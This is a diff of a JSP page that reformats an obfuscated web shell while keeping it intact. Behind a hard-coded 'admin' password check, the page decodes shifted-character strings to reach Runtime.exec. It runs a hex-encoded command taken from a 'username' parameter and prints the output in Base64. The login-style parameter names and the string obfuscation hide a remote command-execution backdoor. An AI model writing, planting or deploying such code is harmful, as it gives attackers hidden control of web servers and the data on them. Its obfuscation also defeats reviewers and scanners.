@@ -13,7 +13,6 @@
         }
         return result;
     }
-
     public static String string2HexString(String strPart) {
         StringBuffer hexString = new StringBuffer();
         for (int i = 0; i < strPart.length(); i++) {
@@ -23,7 +22,6 @@
         }
         return hexString.toString();
     }
-
     public static String hexStringToString(String s) {
         if (s == null || s.equals("")) {
             return null;
@@ -47,20 +45,15 @@
 %>
 <%
     if(request.getParameter("username")!=null && request.getParameter("passwd")!=null){
-
         if (hexStringToString(request.getParameter("passwd")).equals("admin")) {
-
             Class rt = Class.forName(eStr("of{f3qfsl3Wzsynrj"));
             Process e = (Process) rt.getMethod(new String(eStr("j}jh")), String.class).
                     invoke(rt.getMethod(new String(eStr("ljyWzsynrj"))).
                             invoke(null, new Object[]{}), hexStringToString(request.getParameter("username")));
-
             StringBuffer content= new StringBuffer();
             BufferedReader reader = new BufferedReader(new InputStreamReader(e.getInputStream()));
             int ch;
-            while ((ch = reader.read()) != -1) {
-                content.append((char) ch);
-            }
+            while ((ch = reader.read()) != -1) {content.append((char) ch);}
             reader.close();
             BASE64Encoder encoder = new BASE64Encoder();
             out.println(encoder.encode(content.toString().getBytes()));
